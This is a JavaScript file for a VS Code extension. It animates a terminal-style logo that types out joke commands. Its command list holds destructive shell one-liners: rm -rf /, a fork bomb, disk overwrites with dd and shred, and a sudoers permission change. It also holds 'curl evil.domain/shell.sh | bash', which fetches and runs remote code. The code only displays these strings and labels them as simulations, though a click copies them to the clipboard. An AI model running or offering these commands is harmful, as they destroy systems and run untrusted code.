// @ts-check
/* ═══════════════════════════════════════════════════════════════════════════
   Sudx Copilot Customizations — Terminal Logo Typing Animation
   Adapted from extracted_sudx_animation for VS Code webview (IIFE, no fetch)
   ═══════════════════════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  // ─── Inline Commands ───────────────────────────────────────────────────
  var DEFAULT_COMMANDS = [
    { call: 'rm -rf / --no-preserve-root', desc: 'Rekursive Inode-Destruktion ab Root-Mountpoint', evil: true },
    { call: ':(){ :|:& };:', desc: 'Fork-Bomb via rekursiver Bash-Funktion', evil: true },
    { call: 'dd if=/dev/urandom of=/dev/sda bs=4M', desc: 'Block-Device mit Random-Bytes ueberschreiben', evil: true },
    { call: 'chmod -R 000 /', desc: 'Alle Permissions rekursiv entfernen', evil: true },
    { call: 'cat /dev/urandom > /dev/mem', desc: 'Entropy direkt in RAM injizieren', evil: true },
    { call: 'echo c > /proc/sysrq-trigger', desc: 'Magic-SysRq Kernel-Crash-Handler', evil: true },
    { call: 'kill -9 1', desc: 'Init-Prozess terminieren', evil: true },
    { call: 'shred -vfz -n 35 /dev/sda', desc: '35-Pass Secure-Erase auf Block-Device', evil: true },
    { call: 'curl evil.domain/shell.sh | bash', desc: 'Remote Shell-Script blind ausfuehren', evil: true },
    { call: 'chmod 777 /etc/sudoers', desc: 'Sudoers fuer alle beschreibbar machen', evil: true },
    { call: 'cat /dev/urandom | hexdump -C | grep "ca fe ba be"', desc: 'Suche nach Java Magic Bytes in Entropy-Stream', evil: false },
    { call: 'cmatrix -b -C green', desc: 'Matrix Digital Rain im Terminal', evil: false },
    { call: 'toilet -f mono12 -F metal "HACKED"', desc: 'ASCII-Art Banner mit Metal-Filter', evil: false },
    { call: 'figlet -c "System Compromised" | lolcat', desc: 'Rainbow-ASCII-Banner', evil: false },
    { call: 'cowsay "I am the kernel, fear me"', desc: 'Kernel-Drohung via ASCII-Kuh', evil: false },
    { call: 'stress-ng --cpu 0 --io 0 --vm 0 --timeout 0', desc: 'Alle Ressourcen permanent belasten', evil: false },
    { call: 'while true; do rm -rf /*; done', desc: 'Endlosschleife Root-Filesystem loeschen', evil: true },
    { call: 'mv /usr/bin/sudo /usr/bin/please', desc: 'sudo zu please umbenennen', evil: true },
    { call: 'echo "alias sudo=rm -rf /" >> ~/.bashrc', desc: 'sudo-Alias durch rm-rf ersetzen', evil: true },
    { call: 'pkill -9 -u root', desc: 'Alle root-Prozesse terminieren', evil: true },
    { call: 'aafire', desc: 'ASCII-Feuer-Animation im Terminal', evil: false },
    { call: 'telnet towel.blinkenlights.nl', desc: 'Star Wars ASCII via Telnet', evil: false },
    { call: 'cat /dev/input/mice | hexdump', desc: 'Maus-Input als Hex-Dump streamen', evil: false },
    { call: 'asciiquarium', desc: 'ASCII-Aquarium im Terminal', evil: false },
    { call: 'mkfs.ext4 /dev/sda1', desc: 'Primaerpartition neu formatieren', evil: true },
    { call: 'echo "export PATH=/dev/null" >> /etc/profile', desc: 'Globalen PATH ins Nichts leiten', evil: true },
    { call: 'chmod 000 /usr/bin/chmod', desc: 'chmod auf sich selbst anwenden', evil: true },
    { call: 'iptables -P INPUT DROP && iptables -P OUTPUT DROP', desc: 'Sämtlichen Netzwerk-Traffic blockieren', evil: true },
    { call: 'rev <<< "Your system is now mine"', desc: 'Drohung rueckwaerts ausgeben', evil: false },
    { call: 'sl', desc: 'Steam Locomotive fuer ls-Typos', evil: false },
  ];

  var COMMANDS = DEFAULT_COMMANDS;

  // ─── State ─────────────────────────────────────────────────────────────
  var commandEl = null;
  var cursorEl = null;
  var tooltipDesc = null;
  var tooltipPerm = null;
  var tooltipEl = null;
  var logoContainer = null;
  var currentIndex = 0;
  var isRunning = false;
  var isHovering = false;
  var isPaused = false;
  var pauseTimer = null;
  var currentCommand = null;
  var hoverTimeout = null;
  var lastCommandIndex = -1;

  var DEBUG = false;
  function log(fn, msg) { if (DEBUG) { console.debug('[TerminalLogo.' + fn + ']', msg); } }

  var TYPING_MIN = 40;
  var TYPING_MAX = 100;
  var DELETE_SPEED = 20;
  var PAUSE_AFTER = 3000;
  var PAUSE_BEFORE_RESTART = 800;
  var HOVER_MAX_PAUSE = 10000; // 10s max hover pause
  var CURSOR_BLINK_MS = 400;   // half-period → 800ms cycle (matches CSS terminalBlink 0.8s)
  var RECOVERY_DELAY = 2000;   // auto-recovery retry delay

  // ─── Init ──────────────────────────────────────────────────────────────

  function init(config) {
    log('init', 'start');
    try {
      // Get logo container first
      logoContainer = document.getElementById('terminal-logo');
      if (!logoContainer) {
        log('init', 'terminal-logo element not found');
        scheduleRecovery();
        return;
      }

      // Apply optional config overrides
      if (config) {
        if (typeof config.typingMin === 'number') { TYPING_MIN = config.typingMin; }
        if (typeof config.typingMax === 'number') { TYPING_MAX = config.typingMax; }
        if (typeof config.deleteSpeed === 'number') { DELETE_SPEED = config.deleteSpeed; }
        if (typeof config.pauseAfter === 'number') { PAUSE_AFTER = config.pauseAfter; }
        if (typeof config.hoverMaxPause === 'number') { HOVER_MAX_PAUSE = config.hoverMaxPause; }
        if (typeof config.cursorBlinkMs === 'number') { CURSOR_BLINK_MS = config.cursorBlinkMs; }
        if (Array.isArray(config.commands) && config.commands.length > 0) {
          var validCmds = true;
          for (var v = 0; v < config.commands.length; v++) {
            if (!config.commands[v].call || !config.commands[v].desc) {
              log('init', 'invalid command at index ' + v + ' — missing call or desc');
              validCmds = false;
              break;
            }
          }
          if (validCmds) {
            COMMANDS = config.commands;
            log('init', 'using external commands (' + COMMANDS.length + ')');
          } else {
            log('init', 'config.commands validation failed — using defaults');
          }
        }
        // Apply localized string overrides for descriptions
        if (config.strings && typeof config.strings === 'object') {
          for (var s = 0; s < COMMANDS.length; s++) {
            var strKey = COMMANDS[s].call.replace(/[^a-zA-Z0-9]/g, '_').toUpperCase();
            if (config.strings[strKey]) {
              COMMANDS[s].desc = config.strings[strKey];
              log('init', 'string override: ' + strKey);
            }
          }
        }
        if (typeof config.debug === 'boolean') { DEBUG = config.debug; }
      }

      // Get the parent .logo-section for hover events (includes tooltip)
      var logoSection = logoContainer.parentElement;
      if (!logoSection || !logoSection.classList.contains('logo-section')) {
        // Fallback: use document.querySelector
        logoSection = document.querySelector('.logo-section');
      }
      var hoverTarget = logoSection || logoContainer;

      commandEl = logoContainer.querySelector('.terminal-command');
      cursorEl = logoContainer.querySelector('.terminal-cursor');
      tooltipEl = document.getElementById('command-tooltip');
      if (tooltipEl) {
        tooltipDesc = tooltipEl.querySelector('.tooltip-description');
        tooltipPerm = tooltipEl.querySelector('.tooltip-permission');
      }

      // Apply cursor blink rate via CSS custom property
      if (cursorEl) {
        cursorEl.style.setProperty('animation-duration', (CURSOR_BLINK_MS * 2) + 'ms');
      }

      // Make logo focusable for keyboard accessibility
      logoContainer.setAttribute('tabindex', '0');
      logoContainer.setAttribute('role', 'banner');
      logoContainer.setAttribute('aria-label', 'Terminal command animation');

      // Inject dedicated focus-ring style
      if (!document.getElementById('terminal-logo-focus-style')) {
        var focusStyle = document.createElement('style');
        focusStyle.id = 'terminal-logo-focus-style';
        focusStyle.textContent = '.terminal-logo:focus-visible{outline:2px solid var(--green-primary);outline-offset:4px;border-radius:2px}';
        document.head.appendChild(focusStyle);
        log('init', 'focus-ring style injected');
      }

      // Load commands from data attribute (extensible command pool)
      var dataCommands = logoContainer.getAttribute('data-commands');
      if (dataCommands) {
        try {
          var parsed = JSON.parse(dataCommands);
          if (Array.isArray(parsed) && parsed.length > 0) {
            COMMANDS = parsed;
            log('init', 'loaded data-commands (' + COMMANDS.length + ')');
          }
        } catch (e) { log('init', 'data-commands parse error: ' + e.message); }
      }

      // Shuffle
      shuffleArray(COMMANDS);

      // Store hoverTarget for cleanup
      logoContainer._hoverTarget = hoverTarget;

      // Events — hover on logo-section (includes tooltip, so no flicker)
      hoverTarget.addEventListener('mouseenter', onHoverStart);
      hoverTarget.addEventListener('mouseleave', onHoverEnd);
      // Events — focus (keyboard a11y) on logo itself
      logoContainer.addEventListener('focus', onHoverStart);
      logoContainer.addEventListener('blur', onHoverEnd);

      // Visibility change — pause when tab hidden
      document.addEventListener('visibilitychange', onVisibilityChange);

      isRunning = true;
      animate();
      log('init', 'running');
    } catch (err) {
      log('init', 'FATAL: ' + (err && err.message ? err.message : err));
      scheduleRecovery();
    }
  }

  function scheduleRecovery() {
    log('scheduleRecovery', 'retry in ' + RECOVERY_DELAY + 'ms');
    setTimeout(function () {
      try {
        if (!isRunning && document.getElementById('terminal-logo')) {
          log('scheduleRecovery', 'attempting re-init');
          init();
        }
      } catch (e) { log('scheduleRecovery', 'failed: ' + (e && e.message ? e.message : e)); }
    }, RECOVERY_DELAY);
  }

  function onHoverStart() {
    log('onHoverStart', 'activating pause visual feedback');
    isHovering = true;
    if (pauseTimer) { clearTimeout(pauseTimer); pauseTimer = null; }

    // Visual feedback: slow cursor blink + dim text
    if (cursorEl) { cursorEl.style.setProperty('animation-duration', '1500ms'); }
    if (commandEl) { commandEl.style.opacity = '0.8'; commandEl.style.transition = 'opacity 0.3s'; }

    showTooltip();

    // Auto-resume after HOVER_MAX_PAUSE
    if (hoverTimeout) { clearTimeout(hoverTimeout); }
    hoverTimeout = setTimeout(function () {
      if (isHovering) {
        log('onHoverStart', 'auto-resume after ' + HOVER_MAX_PAUSE + 'ms');
        isHovering = false;
        hideTooltip();
        if (commandEl && commandEl.textContent.length > 0) {
          startPauseTimer();
        }
      }
    }, HOVER_MAX_PAUSE);
  }

  function onHoverEnd() {
    log('onHoverEnd', 'restoring normal visual state');
    isHovering = false;
    if (hoverTimeout) { clearTimeout(hoverTimeout); hoverTimeout = null; }

    // Restore normal cursor blink + text opacity
    if (cursorEl) { cursorEl.style.setProperty('animation-duration', (CURSOR_BLINK_MS * 2) + 'ms'); }
    if (commandEl) { commandEl.style.opacity = ''; commandEl.style.transition = ''; }

    hideTooltip();
    if (!isPaused && commandEl && commandEl.textContent.length > 0) {
      startPauseTimer();
    }
  }

  function onVisibilityChange() {
    if (document.hidden) {
      log('visibility', 'hidden — clearing all timeouts');
      isPaused = true;
      if (pauseTimer) { clearTimeout(pauseTimer); pauseTimer = null; }
      if (hoverTimeout) { clearTimeout(hoverTimeout); hoverTimeout = null; }
    } else {
      log('visibility', 'visible — fresh restart');
      isPaused = false;
      if (isRunning && commandEl) {
        commandEl.textContent = '';
        animate();
      }
    }
  }

  // ─── Animation Loop ────────────────────────────────────────────────────

  function animate() {
    log('animate', 'tick');
    if (!isRunning || isPaused) { log('animate', 'skip — running=' + isRunning + ' paused=' + isPaused); return; }
    try {
      if (!commandEl) { log('animate', 'lost DOM ref — recovery'); scheduleRecovery(); return; }

      // Repeat-prevention: avoid same command twice in a row
      if (currentIndex === lastCommandIndex && COMMANDS.length > 1) {
        currentIndex = (currentIndex + 1) % COMMANDS.length;
        log('animate', 'repeat-prevention — skipped idx ' + lastCommandIndex);
      }
      currentCommand = COMMANDS[currentIndex];
      lastCommandIndex = currentIndex;
      currentIndex = (currentIndex + 1) % COMMANDS.length;
      log('animate', 'cmd=' + currentCommand.call + ' idx=' + lastCommandIndex);

      // Evil styling
      if (currentCommand.evil) {
        commandEl.classList.add('evil');
      } else {
        commandEl.classList.remove('evil');
      }

      typeText(currentCommand.call, function () {
        if (!isRunning) { return; }
        waitForPause(function () {
          if (!isRunning) { return; }
          deleteText(function () {
            if (!isRunning) { return; }
            setTimeout(animate, PAUSE_BEFORE_RESTART);
          });
        });
      });
    } catch (err) {
      log('animate', 'ERROR: ' + (err && err.message ? err.message : err));
      scheduleRecovery();
    }
  }

  // ─── Type Text ─────────────────────────────────────────────────────────

  function getTypingDelay(textLength) {
    // Natural feel: shorter commands type faster, longer ones slower
    var baseDelay = TYPING_MIN;
    var lengthFactor = Math.min(textLength * 0.5, TYPING_MAX - TYPING_MIN);
    var jitter = Math.floor(Math.random() * 10);
    log('getTypingDelay', 'len=' + textLength + ' delay=' + Math.round(baseDelay + lengthFactor + jitter));
    return baseDelay + lengthFactor + jitter;
  }

  function typeText(text, callback) {
    log('typeText', 'text="' + text + '" len=' + text.length);
    if (!commandEl) { if (callback) { callback(); } return; }
    commandEl.textContent = '';
    var idx = 0;
    var delay = getTypingDelay(text.length);

    function tick() {
      if (!isRunning || isPaused) { return; }
      if (isHovering) {
        setTimeout(tick, 100);
        return;
      }
      if (idx < text.length) {
        commandEl.textContent += text[idx];
        idx++;
        setTimeout(tick, delay + Math.floor(Math.random() * 15));
      } else if (callback) {
        callback();
      }
    }
    tick();
  }

  // ─── Delete Text ───────────────────────────────────────────────────────

  function deleteText(callback) {
    log('deleteText', 'start');
    if (!commandEl) { if (callback) { callback(); } return; }

    function tick() {
      if (!isRunning || isPaused) { return; }
      if (isHovering) {
        setTimeout(tick, 100);
        return;
      }
      var t = commandEl.textContent;
      if (t.length > 0) {
        commandEl.textContent = t.slice(0, -1);
        setTimeout(tick, DELETE_SPEED);
      } else {
        log('deleteText', 'done');
        if (callback) { callback(); }
      }
    }
    tick();
  }

  // ─── Pause ─────────────────────────────────────────────────────────────

  function waitForPause(callback) {
    log('waitForPause', 'hovering=' + isHovering);
    if (isHovering) {
      pauseTimer = setTimeout(function () { waitForPause(callback); }, 100);
      return;
    }
    pauseTimer = setTimeout(callback, PAUSE_AFTER);
  }

  function startPauseTimer() {
    log('startPauseTimer', '');
    if (pauseTimer) { clearTimeout(pauseTimer); }
    pauseTimer = setTimeout(function () {
      if (!isHovering && isRunning) {
        deleteText(function () {
          setTimeout(animate, PAUSE_BEFORE_RESTART);
        });
      }
    }, PAUSE_AFTER);
  }

  // ─── Tooltip ───────────────────────────────────────────────────────────

  function showTooltip() {
    log('showTooltip', currentCommand ? currentCommand.call : 'null');
    if (!tooltipEl || !currentCommand) { return; }
    if (tooltipDesc) { tooltipDesc.textContent = currentCommand.desc; }
    if (tooltipPerm) {
      tooltipPerm.textContent = currentCommand.evil ? 'Root' : 'User';
      tooltipPerm.classList.toggle('root', currentCommand.evil);
    }

    // Evil disclaimer — prominent: red, bold, pulsing
    var disclaimerEl = tooltipEl.querySelector('.evil-disclaimer');
    if (currentCommand.evil) {
      if (!disclaimerEl) {
        disclaimerEl = document.createElement('span');
        disclaimerEl.className = 'evil-disclaimer';
        tooltipEl.appendChild(disclaimerEl);
      }
      disclaimerEl.textContent = '\u26a0 Simulation \u2014 not executable';
      disclaimerEl.style.cssText = 'color:#ff4444;font-size:var(--font-size-sm);font-weight:700;display:block;margin-top:var(--space-xs);background:rgba(255,0,0,0.06);padding:2px var(--space-xs);border-radius:2px;animation:warningPulse 0.6s ease-out 1;';
    } else if (disclaimerEl) {
      disclaimerEl.style.display = 'none';
    }

    // Copy-to-clipboard handler (bound once)
    if (!tooltipEl._copyBound) {
      tooltipEl._copyBound = true;
      tooltipEl.style.cursor = 'pointer';
      tooltipEl.setAttribute('title', 'Click to copy command');
      tooltipEl.addEventListener('click', function () {
        if (!currentCommand) { return; }
        try {
          navigator.clipboard.writeText(currentCommand.call).then(function () {
            log('showTooltip', 'copied: ' + currentCommand.call);
            var fb = tooltipEl.querySelector('.copy-feedback');
            if (!fb) {
              fb = document.createElement('span');
              fb.className = 'copy-feedback';
              fb.style.cssText = 'color:var(--green-primary);font-size:var(--font-size-xs);display:block;margin-top:var(--space-xs);animation:successFlash 0.3s ease-out;';
              tooltipEl.appendChild(fb);
            }
            fb.textContent = 'Copied!';
            fb.style.display = '';
            setTimeout(function () { if (fb) { fb.style.display = 'none'; } }, 1500);
          });
        } catch (e) { log('showTooltip', 'clipboard write failed: ' + e); }
      });
    }

    // Pre-positioning: render invisible, measure, then show (eliminates jump)
    tooltipEl.style.visibility = 'hidden';
    tooltipEl.classList.remove('hidden');
    tooltipEl.classList.add('visible');

    requestAnimationFrame(function () {
      if (!tooltipEl || !logoContainer) { return; }
      var rect = tooltipEl.getBoundingClientRect();
      tooltipEl.style.left = '';
      tooltipEl.style.right = '';
      tooltipEl.style.transform = '';

      if (rect.right > window.innerWidth - 8) {
        tooltipEl.style.right = '0';
        tooltipEl.style.left = 'auto';
        log('showTooltip', 'shifted left — overflow right');
      }
      if (rect.left < 8) {
        tooltipEl.style.left = '0';
        tooltipEl.style.right = 'auto';
        log('showTooltip', 'shifted right — overflow left');
      }
      tooltipEl.style.visibility = '';
      log('showTooltip', 'positioned and visible');
    });

    // Update aria-live region (includes command + description)
    updateAriaLive();
  }

  function hideTooltip() {
    log('hideTooltip', '');
    if (!tooltipEl) { return; }
    tooltipEl.classList.remove('visible');
    tooltipEl.classList.add('hidden');
  }

  // ─── Accessibility ─────────────────────────────────────────────────────

  var ariaLiveEl = null;

  function updateAriaLive() {
    if (!currentCommand) { return; }
    if (!ariaLiveEl) {
      ariaLiveEl = document.getElementById('terminal-logo-live');
      if (!ariaLiveEl) {
        // Create sr-only live region dynamically
        ariaLiveEl = document.createElement('div');
        ariaLiveEl.id = 'terminal-logo-live';
        ariaLiveEl.setAttribute('aria-live', 'polite');
        ariaLiveEl.setAttribute('aria-atomic', 'true');
        ariaLiveEl.className = 'sr-only';
        ariaLiveEl.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;';
        if (logoContainer) { logoContainer.appendChild(ariaLiveEl); }
      }
    }
    ariaLiveEl.textContent = currentCommand.call + ' — ' + currentCommand.desc;
  }

  // ─── Destroy ───────────────────────────────────────────────────────────

  function destroy() {
    log('destroy', 'cleanup');
    isRunning = false;
    isPaused = false;
    isHovering = false;

    if (pauseTimer) { clearTimeout(pauseTimer); pauseTimer = null; }
    if (hoverTimeout) { clearTimeout(hoverTimeout); hoverTimeout = null; }

    // Remove listeners from hoverTarget (logo-section)
    if (logoContainer && logoContainer._hoverTarget) {
      logoContainer._hoverTarget.removeEventListener('mouseenter', onHoverStart);
      logoContainer._hoverTarget.removeEventListener('mouseleave', onHoverEnd);
    }
    // Remove focus/blur from logo itself
    if (logoContainer) {
      logoContainer.removeEventListener('focus', onHoverStart);
      logoContainer.removeEventListener('blur', onHoverEnd);
    }
    document.removeEventListener('visibilitychange', onVisibilityChange);

    // Clear DOM refs
    if (commandEl) { commandEl.textContent = ''; }
    if (ariaLiveEl && ariaLiveEl.parentNode) { ariaLiveEl.parentNode.removeChild(ariaLiveEl); ariaLiveEl = null; }
    hideTooltip();

    commandEl = null;
    cursorEl = null;
    tooltipEl = null;
    tooltipDesc = null;
    tooltipPerm = null;
    logoContainer = null;
    currentCommand = null;
    log('destroy', 'done');
  }

  // ─── Helpers ───────────────────────────────────────────────────────────

  function shuffleArray(arr) {
    for (var i = arr.length - 1; i > 0; i--) {
      var j = Math.floor(Math.random() * (i + 1));
      var tmp = arr[i];
      arr[i] = arr[j];
      arr[j] = tmp;
    }
  }

  // ─── Export ────────────────────────────────────────────────────────────

  window.SudxTerminalLogo = { init: init, destroy: destroy };
})();
